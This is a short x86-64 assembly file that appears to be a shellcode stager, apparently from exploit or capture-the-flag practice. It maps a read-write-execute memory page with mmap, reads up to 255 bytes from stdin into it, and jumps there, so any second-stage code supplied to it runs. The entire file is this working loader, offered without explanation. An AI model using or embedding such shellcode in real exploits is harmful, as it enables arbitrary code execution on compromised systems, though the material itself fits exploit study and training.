BITS 64

global _start:

_start:

 ;mmap(0, 0xFF, 0x7, 0x22, -1, 0)
 xor rax, rax
 mov al, 8
 add rax, 1		;fix value to 0x9
 xor r9, r9
 xor rsi, rsi
 xor r8, r8
 sub r8, 1
 mov r10b, 0x22
 mov dl, 0x7
 mov sil, 0xFF
 xor rdi, rdi
 syscall

 ;read(0, 0xFF ,rax)
 mov rsi, rax		;new address
 mov dl, 0xff
 xor rdi, rdi		;read on stdin
 xor rax, rax
 syscall

 jmp rsi
